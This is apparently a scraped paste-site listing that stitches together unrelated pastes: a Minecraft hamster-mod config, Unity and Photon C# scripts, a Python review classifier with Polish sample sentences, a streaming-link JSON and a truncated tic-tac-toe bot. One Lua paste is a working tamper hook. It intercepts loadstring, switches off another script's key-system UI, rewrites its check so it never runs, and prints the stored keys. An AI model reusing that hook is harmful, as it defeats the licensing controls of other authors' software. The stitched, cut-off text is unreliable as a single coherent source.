    public boolean enableShoulderCreeperDetection = true;

    @Translatable.Name(""Creeper Detection Radius (Blocks)"")
    @Translatable.Desc(""Adjust paranoia levels."")
    public ValidatedDouble shoulderCreeperDetectionRadius = new ValidatedDouble(16.0, 16.0, 1.0);

    @Translatable.Name(""Enable Diamond Detection"")
    @Translatable.Desc(""Because who doesn’t enjoy unsolicited financial advice from a rodent?"")
    public boolean enableShoulderDiamondDetection = true;

    @ConfigGroup.Pop
    @Translatable.Name(""Diamond Detection Radius (Blocks)"")
    @Translatable.Desc(""How close you need to be before the squeak says \""bling.\"""")
    public ValidatedDouble shoulderDiamondDetectionRadius = new ValidatedDouble(10.0, 20.0, 5.0);

    // --- Hamster Yeet Settings ---
    @Translatable.Name(""Hamster Yeet Settings"")
    @Translatable.Desc(""For when you need a furry, surprisingly aerodynamic solution."")
    public ConfigGroup yeetSettings = new ConfigGroup(""yeetSettings"", true);

    @Translatable.Name(""Throw Velocity"")
    @Translatable.Desc(""The base throw speed of your furry projectile."")
    public ValidatedDouble hamsterThrowVelocity = new ValidatedDouble(1.5, 5.0, 0.1);

    @ConfigGroup.Pop
    @Translatable.Name(""Throw Velocity (Buffed)"")
    @Translatable.Desc(""The throw speed of your furry projectile when under the influence of Steamed Green Beans. Goes from 'yeet' to 'yote'."")
    public ValidatedDouble hamsterThrowVelocityBuffed = new ValidatedDouble(2.5, 5.0, 0.1);

    // --- Independent Diamond Seeking Settings ---
    @Translatable.Name(""Independent Diamond Seeking Settings"")
    @Translatable.Desc(""Unleash free-range prospectors. What could go wrong?"")
    public ConfigGroup independentDiamondSeeking = new ConfigGroup(""independentDiamondSeeking"", true);

    @Translatable.Name(""Enable Independent Diamond Seeking"")
    @Translatable.Desc(""Permit hamsters to embark on solo get-rich-quick schemes?"")
    public boolean enableIndependentDiamondSeeking = true;

    @Translatable.Name(""Diamond Seek Scan Radius (Blocks)"")
    @Translatable.Desc(""How far a hamster scans once it’s decided to play prospector."")
    public ValidatedInt diamondSeekRadius = new ValidatedInt(10, 20, 5);

    @ConfigGroup.Pop
    @Translatable.Name(""Gold 'Mistake' Chance"")
    @Translatable.Desc(""The probability (0.0 to 1.0) that a hamster will seek gold instead of diamond, if both are available. At 0.5, it's a coin toss. At 1.0, it's guaranteed hamster sulking."")
    public ValidatedFloat goldMistakeChance = new ValidatedFloat(0.33f, 1.0f, 0.0f);

    // --- Diamond Stealing Behavior Settings---
    @Translatable.Name(""Diamond Stealing Behavior Settings"")
    @Translatable.Desc(""For when your hamster develops a taste for the finer things in life. Can be configured so they steal any item— even from other mods, but they only steal diamonds by default."")
    public ConfigGroup diamondStealing = new ConfigGroup(""diamondStealing"", true);

    @Translatable.Name(""Enable Diamond Stealing"")
    @Translatable.Desc(""Permits hamsters to engage in spontaneous, high-stakes games of keep-away with your valuables. A chase ensues. Obviously."")
    public boolean enableDiamondStealing = true;

    @Translatable.Name(""Stealable Items"")
    @Translatable.Desc(""A list of item IDs hamsters find irresistible. Format: 'mod_id:item_id'. Example: 'minecraft:diamond'."")
    public List<String> stealableItems = new ArrayList<>(List.of(""minecraft:diamond""));

    @Translatable.Name(""Pounce Chance"")
    @Translatable.Desc(""Probability (0.1 to 1.0) a hamster will succumb to temptation. High by default. You shouldn't leave your diamonds lying around anyway."")
    public ValidatedFloat diamondPounceChance = new ValidatedFloat(0.75f, 1.0f, 0.1f);

    @Translatable.Name(""Minimum Flee Distance (Blocks)"")
    @Translatable.Desc(""The hamster's personal space bubble."")
    public ValidatedInt minFleeDistance = new ValidatedInt(5, 20, 1);

    @Translatable.Name(""Maximum Flee Distance (Blocks)"")
    @Translatable.Desc(""The maximum distance before the hamster gets bored and stops running to taunt you."")
    public ValidatedInt maxFleeDistance = new ValidatedInt(20, 40, 5);

    @Translatable.Name(""Minimum Steal Duration (Seconds)"")
    @Translatable.Desc(""The shortest amount of time the hamster will entertain this little game before getting bored and dropping your stuff."")
    public ValidatedInt minStealDurationSeconds = new ValidatedInt(5, 240, 1);

    @ConfigGroup.Pop
    @Translatable.Name(""Maximum Steal Duration (Seconds)"")
    @Translatable.Desc(""The longest your cardio session can last before the hamster's attention span gives out."")
    public ValidatedInt maxStealDurationSeconds = new ValidatedInt(15, 300, 5);

    // --- Tamed Sleep Settings ---
    @Translatable.Name(""Tamed Sleep Settings"")
    @Translatable.Desc(""Even digital rodents need beauty sleep— adjust according to your patience levels."")
    public ConfigGroup tamedSleepSettings = new ConfigGroup(""tamedSleepSettings"", true);

    @Translatable.Name(""Threat Radius (Blocks)"")
    @Translatable.Desc(""How close a hostile mob can get before a hamster wakes up from it's power nap."")
    public ValidatedInt tamedSleepThreatDetectionRadiusBlocks = new ValidatedInt(8, 32, 1);

    @Translatable.Name(""Require Daytime?"")
    @Translatable.Desc(""Night-owl hamsters? Your choice."")
    public boolean requireDaytimeForTamedSleep = true;

    @Translatable.Name(""Min Sit Time Before Drowsy (Secs)"")
    @Translatable.Desc(""Minimum seconds before a sitting hamster gets sleepy."")
    public ValidatedInt tamedQuiescentSitMinSeconds = new ValidatedInt(120, 300, 1);

    @ConfigGroup.Pop
    @Translatable.Name(""Max Sit Time Before Drowsy (Secs)"")
    @Translatable.Desc(""Maximum seconds before the inevitable deep snooze."")
    public ValidatedInt tamedQuiescentSitMaxSeconds = new ValidatedInt(180, 600, 2);

    // --- Combat & Damage Settings ---
    @Translatable.Name(""Combat & Damage Settings"")
    @Translatable.Desc(""Squeak-first, ask questions later. Dial in the rodent kung fu."")
    public ConfigGroup combat = new ConfigGroup(""combat"", true);

    @Translatable.Name(""Melee Damage"")
    @Translatable.Desc(""Tamed hamster melee damage. Mostly for show, let's be honest."")
    public ValidatedDouble meleeDamage = new ValidatedDouble(2.0, 40.0, 0.0);

    @ConfigGroup.Pop
    @Translatable.Name(""Throw Damage"")
    @Translatable.Desc(""Damage dealt by thrown hamster. Surprisingly effective against Creepers. How convenient."")
    public ValidatedDouble hamsterThrowDamage = new ValidatedDouble(20.0, 40.0, 0.0);

    // --- Food Healing Settings ---
    @Translatable.Name(""Food Healing Settings"")
    @Translatable.Desc(""Nutrition— isn't it wonderful. Tweaks to snacks."")
    public ConfigGroup foodHealing = new ConfigGroup(""foodHealing"", true);

    @Translatable.Name(""Food Mix"")
    @Translatable.Desc(""Healing amount from Hamster Food Mix. The good stuff."")
    public ValidatedFloat hamsterFoodMixHealing = new ValidatedFloat(4.0f, 10.0f, 0.0f);

    @ConfigGroup.Pop
    @Translatable.Name(""Standard Food"")
    @Translatable.Desc(""Healing from basic seeds/crops. Better than nothing… probably."")
    public ValidatedFloat standardFoodHealing = new ValidatedFloat(2.0f, 5.0f, 0.0f);

    // --- Cheese Food Settings ---
    @Translatable.Name(""Cheese Settings"")
    @Translatable.Desc(""Cheese... the gooey wonder. Some people think it's overpowered. I disagree. Obviously."")
    public ConfigGroup cheeseHealing = new ConfigGroup(""cheeseHealing"", true);

    @Translatable.Name(""Cheese Nutrition"")
    @Translatable.Desc(""How many little hunger shanks the cheese restores. Vanilla cooked steak is 8. I know you're thinking of moving it to 20, you monster."")
    public ValidatedInt cheeseNutrition = new ValidatedInt(8, 20, 0);

    @ConfigGroup.Pop
    @Translatable.Name(""Cheese Saturation"")
    @Translatable.Desc(""How long the hunger effect lasts. Cooked steak is 0.8. Don't get too crazy. Or do. I'm not your conscience."")
    public ValidatedFloat cheeseSaturation = new ValidatedFloat(0.8f, 2.0f, 0.0f);

    // --- Green Bean Buff Settings ---
    @Translatable.Name(""Green Bean Buff Settings"")
    @Translatable.Desc(""Nutrition, but make it dramatic. Tweaks to caffeine-bean highs."")
    public ConfigGroup greenBeanBuffs = new ConfigGroup(""greenBeanBuffs"", true);

    @Translatable.Name(""Duration (Ticks)"")
    @Translatable.Desc(""Steamed beans: power that fades faster than your attention span."")
    public ValidatedInt greenBeanBuffDuration = new ValidatedInt(3600, 20 * 60 * 10, 20);

    @Translatable.Name(""Speed Level"")
    @Translatable.Desc(""Because someone has to go fast."")
    public ValidatedInt greenBeanBuffAmplifierSpeed = new ValidatedInt(1, 4, 0);

    @Translatable.Name(""Strength Level"")
    @Translatable.Desc(""Slightly mightier nibbles."")
    public ValidatedInt greenBeanBuffAmplifierStrength = new ValidatedInt(1, 4, 0);

    @Translatable.Name(""Absorption Level"")
    @Translatable.Desc(""Extra fluff padding for those daring dives."")
    public ValidatedInt greenBeanBuffAmplifierAbsorption = new ValidatedInt(1, 4, 0);

    @ConfigGroup.Pop
    @Translatable.Name(""Regen Level"")
    @Translatable.Desc(""Heals minor paper-cuts (and fragile egos)."")
    public ValidatedInt greenBeanBuffAmplifierRegen = new ValidatedInt(0, 4, 0);

    // --- Worldgen: Bush & Sunflower Stuff ---
    @Translatable.Name(""Worldgen: Bush & Sunflower Stuff"")
    @Translatable.Desc(""For The Aspiring Landscape Artist. Note: Most of these settings require re-logging into your world to take effect, and it's unlikely you will see changes in chunks that have already been generated."")
    public ConfigGroup worldGenMisc = new ConfigGroup(""worldGenMisc"", true);

    @Translatable.Name(""Wild Bush Regrowth Modifier"")
    @Translatable.Desc(""Higher = slower, lower = faster. Makes perfect sense."")
    public ValidatedDouble wildBushRegrowthModifier = new ValidatedDouble(1.0, 5.0, 0.1);

    // --- Sunflower Settings ---
    @Translatable.Name(""Sunflower Settings"")
    @Translatable.Desc(""Custom sunflowers, because the vanilla ones just weren’t fabulous enough. Only changes fresh chunks."")
    public ConfigGroup sunflowerSettings = new ConfigGroup(""sunflowerSettings"", true);

    @Translatable.Name(""Sunflower Seed Regrowth Speed"")
    @Translatable.Desc(""Higher = slower, lower = faster. Photosynthesis is hard, okay?"")
    public ValidatedDouble sunflowerRegrowthModifier = new ValidatedDouble(1.0, 5.0, 0.1);

    @ConfigGroup.Pop
    @Translatable.Name(""Allowed Biomes"")
    @Translatable.Desc(""Specific biome IDs where these sunflowers can replace the vanilla ones. Format: 'mod_id:biome_name'. They’re picky."")
    public List<String> sunflowerBiomes = new ArrayList<>(List.of(""minecraft:sunflower_plains""));

    // --- Cucumber Bush Settings ---
    @Translatable.Name(""Cucumber Bush Settings"")
    @Translatable.Desc(""Wild cucumbers, for when you need emergency salads in the savanna. Only changes fresh chunks."")
    public ConfigGroup cucumberBushSettings = new ConfigGroup(""cucumberBushSettings"", true);

    @Translatable.Name(""Cucumber Bush Rarity"")
    @Translatable.Desc(""1 in X chunks. Lower numbers means cucumbers take over the planet."")
    public ValidatedInt wildCucumberBushRarity = new ValidatedInt(24, 100, 1);

    @Translatable.Name(""Vanilla Biome Tags"")
    @Translatable.Desc(""Biome tags where cucumbers feel at home. Format: 'mod_id:tag_name', for example: 'minecraft:is_jungle'."")
    public List<String> cucumberBushTags = new ArrayList<>(List.of(""minecraft:is_jungle""));

    @Translatable.Name(""Convention Biome Tags"")
    @Translatable.Desc(""Convention tags for maximum mod-pack harmony. Format: 'mod_id:tag_name', for example: 'minecraft:is_jungle'."")
    public List<String> cucumberBushConventionTags = new ArrayList<>(List.of(
            ""c:is_temperate"",
            ""c:is_hot"",
            ""c:is_dry""
    ));

    @Translatable.Name(""Specific Biomes"")
    @Translatable.Desc(""Specific biome IDs where cucumbers can sprout. Format: 'mod_id:biome_name', for example: 'minecraft:savanna'."")
    public List<String> cucumberBushBiomes = new ArrayList<>(List.of(
            ""minecraft:plains"",
            ""minecraft:sunflower_plains"",
            ""minecraft:savanna"",
            ""minecraft:savanna_plateau"",
            ""minecraft:forest"",
            ""minecraft:birch_forest"",
            ""minecraft:meadow"",
            ""minecraft:wooded_badlands"",
            ""minecraft:jungle"",
            ""minecraft:sparse_jungle"",
            ""minecraft:bamboo_jungle""
    ));

    @ConfigGroup.Pop
    @Translatable.Name(""Specific Exclusions"")
    @Translatable.Desc(""Biomes where cucumbers are absolutely NOT allowed. Overrides everything else. Format: 'mod_id:biome_name', for example: 'minecraft:ocean'."")
    public List<String> cucumberBushExclusions = new ArrayList<>(List.of(
            ""minecraft:swamp"",
            ""minecraft:mangrove_swamp"",
            ""minecraft:mushroom_fields"",
            ""minecraft:ocean"",
            ""minecraft:deep_ocean"",
            ""minecraft:warm_ocean"",
            ""minecraft:stony_peaks""
    ));

    // --- Green Bean Bush Settings ---
    @Translatable.Name(""Green Bean Bush Settings"")
    @Translatable.Desc(""Legumes with attitude. Tuned for that perfect mid-game caffeine hit. Only changes fresh chunks."")
    public ConfigGroup greenBeanBushSettings = new ConfigGroup(""greenBeanBushSettings"", true);

    @Translatable.Name(""Green Bean Bush Rarity"")
    @Translatable.Desc(""1 in X chunks. Lower = beanpocalypse. For those of you in the back, it means they'll spam everywhere."")
    public ValidatedInt wildGreenBeanBushRarity = new ValidatedInt(24, 100, 1);

    @Translatable.Name(""Vanilla Biome Tags"")
    @Translatable.Desc(""Biome tags for bean growth. Empty by default—choose wisely. Format: 'mod_id:tag_name', for example: 'minecraft:is_jungle'."")
    public List<String> greenBeanBushTags = new ArrayList<>(List.of(""mod_id:biome_name""));

    @Translatable.Name(""Convention Biome Tags"")
    @Translatable.Desc(""Convention tags for mod-friendly bean spam. Format: 'mod_id:tag_name', for example: 'minecraft:is_jungle'."")
    public List<String> greenBeanBushConventionTags = new ArrayList<>(List.of(
            ""c:is_wet"",
            ""c:is_temperate""
    ));

    @Translatable.Name(""Specific Biomes"")
    @Translatable.Desc(""Specific biomes where beans sprout like gossip in chat. Format: 'mod_id:biome_name', for example: 'minecraft:swamp'."")
    public List<String> greenBeanBushBiomes = new ArrayList<>(List.of(
            ""minecraft:swamp"",
            ""minecraft:mangrove_swamp"",
            ""minecraft:lush_caves"",
            ""minecraft:flower_forest""
    ));

    @ConfigGroup.Pop
    @ConfigGroup.Pop
    @Translatable.Name(""Specific Exclusions"")
    @Translatable.Desc(""Absolutely no beans here, thank you very much. Overrides all other settings. Format: 'mod_id:biome_name', for example: 'minecraft:beach'."")
    public List<String> greenBeanBushExclusions = new ArrayList<>(List.of(
            ""minecraft:beach"",
            ""minecraft:birch_forest"",
            ""minecraft:cherry_grove"",
            ""minecraft:dark_forest"",
            ""minecraft:deep_ocean"",
            ""minecraft:dripstone_caves"",
            ""minecraft:forest"",
            ""minecraft:meadow"",
            ""minecraft:ocean"",
            ""minecraft:old_growth_birch_forest"",
            ""minecraft:plains"",
            ""minecraft:river"",
            ""minecraft:sunflower_plains""
    ));
}
```"
K19cGNpg,Untitled,gandalfbialy,C#,Saturday 26th of July 2025 07:58:52 AM CDT,"using UnityEngine;

public class PaddleMove : MonoBehaviour
{
    public float speed = 5f;

    public float fireRate = 3f;
    float timeFromLastShot = 0;
    public GameObject bullet;

    void Update()
    {
        HandleShooting();

        Move();
    }

    void Move()
    {
        float x = Input.GetAxisRaw(""Horizontal"");

        float speedDirectionX = x * speed * Time.deltaTime;

        if (transform.position.x + speedDirectionX >= 9f)
        {
            return;
        }

        transform.position += new Vector3(speedDirectionX, 0, 0);
    }

    void HandleShooting()
    {
        timeFromLastShot += Time.deltaTime;
        Vector3 position = transform.position + new Vector3(0, 0.2f, 0);

        if (timeFromLastShot >= (1f / fireRate))
        {
            if (Input.GetKeyDown(KeyCode.Space))
            {
                Instantiate(bullet, position, Quaternion.identity);
                timeFromLastShot = 0;
            }
        }
    }
}
"
5YUwCKc7,Untitled,gandalfbialy,Python,Saturday 26th of July 2025 06:15:01 AM CDT,"def load_opinions(file_path):
    with open(file_path, ""r"", encoding=""utf-8"") as f:
        return [line.strip() for line in f if line.strip()]

def classify_opinion_vector(opinion):
    embedding = model.encode([opinion])[0]
    sims = {cat: cosine_similarity([embedding], [vec])[0][0] for cat, vec in category_vectors.items()}
    predicted = max(sims, key=sims.get)
    return predicted, sims

def analyze_opinions(file_path):
    opinions = load_opinions(file_path)
    results = {'pozytywna': 0, 'negatywna': 0}
    all_info = []
    for opinion in opinions:
        cat, sims = classify_opinion_vector(opinion)
        results[cat] += 1
        all_info.append((opinion, cat, sims))
    return results, all_info




def show_results(results):
    labels = list(results.keys())
    counts = list(results.values())
    total = sum(counts)
    percentages = [100 * c / total for c in counts]
    plt.bar(labels, percentages, color=[""green"", ""red""])
    plt.title(""Procent opinii w każdej kategorii"")
    plt.ylabel(""Procent"")
    plt.ylim(0, 100)
    plt.show()

def show_detailed_results(details):
    for i, (opinia, kategoria, podobienstwa) in enumerate(details):
        print(f""\n  Opinia {i+1}: {opinia}"")
        print(f"" Klasyfikacja: {kategoria.upper()}"")
        for kat, val in podobienstwa.items():
            print(f""  → {kat}: {val:.4f}"")
			
			
file_path = ""opinie.txt""
results, details = analyze_opinions(file_path)
show_results(results)
show_detailed_results(details)"
d5iZP6tg,Untitled,gandalfbialy,Python,Saturday 26th of July 2025 06:03:46 AM CDT,"categories = {
    ""pozytywna"": [
        ""Ta gra przerosła wszystkie moje oczekiwania pod względem fabuły i immersji."",
        ""Mechanika rozgrywki jest niesamowicie dopracowana i satysfakcjonująca."",
        ""Grafika w tej produkcji zapiera dech w piersiach."",
        ""Ścieżka dźwiękowa w grze tworzy idealny klimat."",
        ""Sterowanie jest intuicyjne i bardzo responsywne."",
        ""Tryb wieloosobowy działa płynnie, bez lagów i błędów."",
        ""Open world jest ogromny, pełen interesujących zadań i sekretów."",
        ""System rozwoju postaci jest głęboki i daje poczucie prawdziwego progresu."",
        ""Historia jest wciągająca, a postacie wiarygodne i dobrze napisane."",
        ""Optymalizacja stoi na najwyższym poziomie – gra działa stabilnie nawet na średnim sprzęcie."",
        ""Questy poboczne są różnorodne i nieustannie zaskakują."",
        ""Interfejs użytkownika jest czytelny i elegancki."",
        ""Każda lokacja została zaprojektowana z dbałością o najmniejszy detal."",
        ""Gra oferuje mnóstwo opcji personalizacji postaci i ekwipunku."",
        ""Fizyka w grze zachowuje się realistycznie i dodaje rozgrywce dynamiki."",
        ""Współpraca w kooperacji jest znakomicie zbalansowana."",
        ""Wyzwania są odpowiednio trudne, a jednocześnie nie frustrujące."",
        ""Cut-scenki są zachwycające, z pięknymi animacjami."",
        ""Nowatorskie rozwiązania w rozgrywce sprawiają, że gra jest wyjątkowa."",
        ""Replayability jest wysoki – wracam do niej z przyjemnością.""
    ],
    ""negatywna"": [
        ""Gra zawiodła mnie od pierwszych minut monotonnością i powtarzalnością."",
        ""Grafika wygląda jak z poprzedniej dekady i nie jest dopracowana."",
        ""Sterowanie jest toporne i sprawia, że rozgrywka jest frustrująca."",
        ""Optymalizacja jest fatalna – ciągłe spadki klatek i lagi."",
        ""Fabuła jest płaska, a postacie papierowe i pozbawione charakteru."",
        ""Questy poboczne ograniczają się do zbierania przedmiotów bez sensu."",
        ""Multiplayer jest pełen bugów i rozłącza serwery co chwilę."",
        ""Interfejs jest chaotyczny i ciężko znaleźć podstawowe opcje."",
        ""Brak jakiejkolwiek innowacji – to tylko odgrzewany kotlet."",
        ""System rozwoju postaci jest zbyt płytki i nie daje satysfakcji."",
        ""Ścieżka dźwiękowa jest niemal zupełnie nieobecna, brak muzyki i efektów."",
        ""Cut-scenki tną się i mają przestarzałe animacje."",
        ""Mapa świata jest pusta, bez ciekawych miejsc do zwiedzania."",
        ""Brak balansu – przeciwnicy są albo zbyt słabi, albo niepokonanie silni."",
        ""Dialogi są sztuczne i wstawione na siłę."",
        ""Nie ma możliwości zapisania gry w dowolnym momencie."",
        ""W grze brakuje praktycznie jakiejkolwiek opcji personalizacji."",
        ""Po kilku godzinach gra staje się nużąca i przewidywalna."",
        ""Brak wsparcia ze strony deweloperów – łatki nie naprawiają największych problemów."",
        ""Tryb kooperacji jest bezużyteczny z powodu ciągłych błędów sieciowych.""
    ]
}
"
N3QikiLT,dataNone,TestGuy1,JSON,Saturday 26th of July 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'f6e09f7d861b271cda74040242b55452a712a12ac32b53c48d40a389fd1a9077b078192773480ed0697e5cae04b8ccf129b6b30ddd0e5c3b2e12e372b31b37cad95dc983ad47107d834277c724440902d8f28982418ba09eebed75b31bc4bcaa690ae76f259514c1b400a3258fbda47e5234efa8dd398f48bb5e6bf088e2b7c0',
  otherdata: [
    'cf9d15846b85f3c25a051b95049d6a92',
    'e9adffd7307a6faf0863ccffdc387fcf',
    '346936dcf6adcdb8656d1090d1ed353e',
    '788b6d9389880c4b705e41abc3714f63',
    'fbd37074228db19ce603abeb0e7f2988',
    '37e4671e2bea622d78394601f6096b4b',
    '8b2d8074bbc4320dabd684b60f5d2579',
    '2216968372d01e049cd87352cda48617'
  ]
}"
CrSmgi0L,Untitled,gandalfbialy,C#,Saturday 26th of July 2025 04:04:29 AM CDT,"using UnityEngine;
using Photon.Pun;
using TMPro;

public class OnlinePlayer : MonoBehaviourPunCallbacks, IPunObservable
{
    public static GameObject LocalPlayerInstance;

    [Header(""Appearance Components"")]
    public TMP_Text nameText;
    public Renderer carRenderer;

    private int carRego;
    private bool regoSet = false;
    private CheckpointController checkpoint;

    private void Awake()
    {
        if (photonView.IsMine)
        {
            LocalPlayerInstance = gameObject;
        }
    }

    private void Start()
    {
        // Automatycznie znajdź CheckpointController na tym obiekcie lub dzieciach
        checkpoint = GetComponent<CheckpointController>();
        if (checkpoint == null)
        {
            checkpoint = GetComponentInChildren<CheckpointController>();
        }

        // Zastosuj dane z instantiation - robione w Start() żeby mieć pewność że wszystko jest zainicjalizowane
        ApplyInstantiationData();
    }

    private void LateUpdate()
    {
        // Handle leaderboard registration and updates for multiplayer
        if (!regoSet && nameText != null && !string.IsNullOrEmpty(nameText.text))
        {
            carRego = Leaderboard.RegisterCar(nameText.text);
            regoSet = true;
            return;
        }

        // Update leaderboard position
        if (checkpoint != null && regoSet)
        {
            Leaderboard.SetPosition(carRego, checkpoint.lap, checkpoint.checkpoint);
        }
    }

    private void ApplyInstantiationData()
    {
        // Pobierz dane z instantiation data
        object[] data = photonView.InstantiationData;

        if (data != null && data.Length >= 4)
        {
            string playerName = (string)data[0];
            int red = (int)data[1];
            int green = (int)data[2];
            int blue = (int)data[3];

            // Zastosuj wygląd gracza
            ApplyPlayerAppearance(playerName, red, green, blue);
        }
    }

    private void ApplyPlayerAppearance(string playerName, int red, int green, int blue)
    {
        // Ustaw nazwę gracza
        if (nameText != null)
        {
            nameText.text = playerName;
        }

        // Ustaw kolor samochodu
        if (carRenderer != null)
        {
            Color carColor = ColorCar.IntToColor(red, green, blue);
            carRenderer.material.color = carColor;

            // Ustaw również kolor tekstu na kolor samochodu
            if (nameText != null)
            {
                nameText.color = carColor;
            }
        }
    }

    public void OnPhotonSerializeView(PhotonStream stream, PhotonMessageInfo info)
    {
        // Nie potrzebujemy synchronizacji w czasie rzeczywistym dla wyglądu
    }
}"
37C2N28K,testeoxxlista,Manuuuuuerty,JSON,Saturday 26th of July 2025 03:59:47 AM CDT,"{
  ""name"": ""Plooplayerxxx"",
  ""author"": ""Plooplayerxxx"",
  ""telegram"": ""t.me/futbolgratisonlineenhd"",
  ""info"": ""Listasplooplayer"",
  ""stations"": [
   
{
 
""name"":""prvegitasd"",
""image"":"""",
""url"":""https://v0-direct-mp4-download.vercel.app/v/prvegitasd"",
""isHost"":""true""
 
},
 
{
 
""name"":""prvegaghjm"",
""image"":"""",
""url"":""https://v0-direct-mp4-download.vercel.app/v/prvegaghjm"",
""isHost"":""true""
 
},
 
{
 
""name"":""prvega"",
""image"":"""",
""url"":""https://v0-direct-mp4-download.vercel.app/v/prvega"",
""isHost"":""true""
 
}
 
]
}"
vjAeErVK,"I like the way you kiss me, I can tell you miss me",Reseteeee,Lua,Saturday 26th of July 2025 02:26:18 AM CDT,"print(""ready"")
futanari = hookfunc(loadstring, function(I_Like_The_Way_You_Kiss_Me_I_Can_Tell_You_Miss_Me, ...)
	I_Like_The_Way_You_Kiss_Me_I_Can_Tell_You_Miss_Me = I_Like_The_Way_You_Kiss_Me_I_Can_Tell_You_Miss_Me:gsub(""KeyUI%.Enabled%s*=%s*true"", ""KeyUI.Enabled = false"")
	I_Like_The_Way_You_Kiss_Me_I_Can_Tell_You_Miss_Me = I_Like_The_Way_You_Kiss_Me_I_Can_Tell_You_Miss_Me:gsub(""if%s+Settings%.KeySystem%s+then"", [[print(""Key was:"", table.concat(Settings.KeySettings.Key, "", "")) if 69==74 then]])
	return futanari(I_Like_The_Way_You_Kiss_Me_I_Can_Tell_You_Miss_Me, ...)
end)"
3nwYetgB,Untitled,Shisui_Daniel,JSON,Saturday 26th of July 2025 02:09:49 AM CDT,"let games = {};
let tournaments = {};

const playerStats = {}; 
function checkWinner(board) {
    const winPatterns = [
        [0, 1, 2], [3, 4, 5], [6, 7, 8],
        [0, 3, 6], [1, 4, 7], [2, 5, 8],
        [0, 4, 8], [2, 4, 6]
    ];
    for (const pattern of winPatterns) {
        const [a, b, c] = pattern;
        if (board[a] && board[a] === board[b] && board[a] === board[c]) {
            return board[a];
        }
    }
    return null;
}

function isBoardFull(board) {
    return board.every((cell) => cell !== null);
}

function displayBoard(board) {
    let display = """";
    for (let i = 0; i < 9; i++) {
        display += board[i] ? board[i] : ""🟨"";
        display += (i + 1) % 3 === 0 ? ""\n"" : "" "";
    }
    return display;
}

function resetGame(gameID, player1, player2) {
    games[gameID] = {
        board: Array(9).fill(null),
        players: [
            { id: player1.id, name: player1.name, symbol: ""❌"" },
            { id: player2.id, name: player2.name, symbol: ""⭕"" }
        ],
        currentPlayerIndex: 0,
        inProgress: true,
        restartPrompted: false,
        threadID: player1.threadID
    };
}

async function handleGameEnd(gameID, api, event) {
    const game = games[gameID];
    const winner = checkWinner(game.board);
    const boardMessage = displayBoard(game.board);

    if (winner) {
        const winnerPlayer = game.players.find(player => player.symbol === winner);
        const loserPlayer = game.players.find(player => player.symbol !== winner);

        if (!playerStats[winnerPlayer.id]) playerStats[winnerPlayer.id] = { wins: 0, losses: 0 };
        playerStats[winnerPlayer.id].wins++;
        if (!playerStats[loserPlayer.id]) playerStats[loserPlayer.id] = { wins: 0, losses: 0 };
        playerStats[loserPlayer.id].losses++;

        await api.sendMessage(`${boardMessage}\n🎉| ${winnerPlayer.name} 𝚊 𝚐𝚊𝚐𝚗𝚎́ ! 𝚃𝚊𝚙𝚎𝚣 ""𝚛𝚎𝚜𝚝𝚊𝚛𝚝"" 𝚙𝚘𝚞𝚛 𝚛𝚎𝚌𝚘𝚖𝚖𝚎𝚗𝚌𝚎𝚛.`, event.threadID);
        game.inProgress = false;
    } else if (isBoardFull(game.board)) {
        game.players.forEach(player => {
            if (!playerStats[player.id]) playerStats[player.id] = { wins: 0, losses: 0 };
        });
        await api.sendMessage(`${boardMessage}\n🤝| 𝙼𝚊𝚝𝚌𝚑 𝚗𝚞𝚕 ! 𝚃𝚊𝚙𝚎𝚣 '𝚛𝚎𝚜𝚝𝚊𝚛𝚝' 𝚙𝚘𝚞𝚛 𝚛𝚎𝚌𝚘𝚖𝚖𝚎𝚗𝚌𝚎𝚛.`, event.threadID);
        game.inProgress = false;
    }
    game.restartPrompted = true;
}
async function generateTournamentBracketVisual(tournament) {
    let bracket = `╔═══════════════════════════════════╗\n`;
    bracket += `║           🏆 𝚃𝙾𝚄𝚁𝙽𝙾𝙸 𝙳𝙴 𝚃𝙸𝙲-𝚃𝙰c-𝚃𝙾𝙴 🏆                   ║\n`;
    bracket += `╠══════════════════════════════════════╣\n`;
    bracket += `║                                                              ║\n`;
    bracket += `║  𝚂𝚝𝚊𝚝𝚞𝚝 : ${tournament.status === 'registration' ? '𝙸𝚗𝚜𝚌𝚛𝚒𝚙𝚝𝚒𝚘𝚗𝚜 𝚘𝚞𝚟𝚎𝚛𝚝𝚎𝚜' : '𝙴𝚗 𝚌𝚘𝚞𝚛𝚜'}\n`;
    bracket += `║  𝙹𝚘𝚞𝚎𝚞𝚛𝚜 𝚒𝚗𝚜𝚌𝚛𝚒𝚝𝚜 : ${tournament.players.length}/8\n`;
    bracket += `║                                                              ║\n`;
    bracket += `╠══════════════════════════════════════╣\n`;
    bracket += `║                  𝙿𝙰𝚁𝚃𝙸𝙲𝙸𝙿𝙰𝙽𝚃𝚂                           ║\n`;
    bracket += `╠══════════════════════════════════════╣\n`;

    if (tournament.players.length === 0) {
        bracket += `║ 𝙰𝚞𝚌𝚞𝚗 𝚓𝚘𝚞𝚎𝚞𝚛 𝚒𝚗𝚜𝚌𝚛𝚒𝚝 𝚙𝚘𝚞𝚛 𝚕'𝚒𝚗𝚜𝚝𝚊𝚗𝚝.                     ║\n`;
    } else {
        tournament.players.forEach((player, index) => {
            bracket += `║ ${index + 1}. ${player.name}\n`;
        });
    }

    bracket += `╚══════════════════════════════════╝\n`;
    bracket += `    ${tournament.players[0]?.name || '➖'} vs ${tournament.players[1]?.name || '➖'}\n`;
    bracket += `    ${tournament.players[2]?.name || '➖'} vs ${tournament.players[3]?.name || '➖'}\n`;
    bracket += `    ${tournament.players[4]?.name || '➖'} vs ${tournament.players[5]?.name || '➖'}\n`;
    bracket += `    ${tournament.players[6]?.name || '➖'} vs ${tournament.players[7]?.name || '➖'}\n`;

    return bracket;
}


module.exports = {
    config: {
        name: ""tictactoe"",
        aliases: [""ttt""],
        version: ""1.4"",
        author: ""ミ★𝐒𝐎𝐍𝐈𝐂✄𝐄𝚇𝙴 3.0★彡"",
        category: ""game"",
        shortDescription: ""Un jeu de morpion à deux joueurs ou un tournoi à 8 joueurs."",
        usage: ""tictactoe | tictactoe @ami | tictactoe <ID> | tictactoe help | tictactoe stats | ttt tournoi | join | out""
    },

    onStart: async function ({ api, event, args }) {
        const threadID = event.threadID;
        const senderID = event.senderID;
        let opponentID = null;

        if (!playerStats[senderID]) {
            playerStats[senderID] = { wins: 0, losses: 0 };
        }

        const mentionedIDs = Object.keys(event.mentions);
        const command = args[0]?.toLowerCase();
        if (command === ""tournoi"") {
            if (tournaments[threadID] && tournaments[threadID].status === 'registration') {
